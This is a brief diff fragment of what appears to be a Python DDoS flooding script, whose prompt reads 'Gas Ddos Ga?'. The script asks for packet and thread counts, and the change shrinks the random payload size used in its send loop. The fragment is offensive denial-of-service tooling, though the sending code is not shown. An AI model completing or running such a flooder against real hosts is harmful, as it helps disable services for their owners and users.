@@ -15,7 +15,7 @@ choice = str(input(" Gas Ddos Ga?(y/n): "))
 times = int(input(" Packets: "))
 threads = int(input(" Threads: "))
 def run():
-  data = random._urandom(65534)
+  data = random._urandom(12345)
   i = random.choice(("[*]","[!]","[#]"))
   while True:
     try:
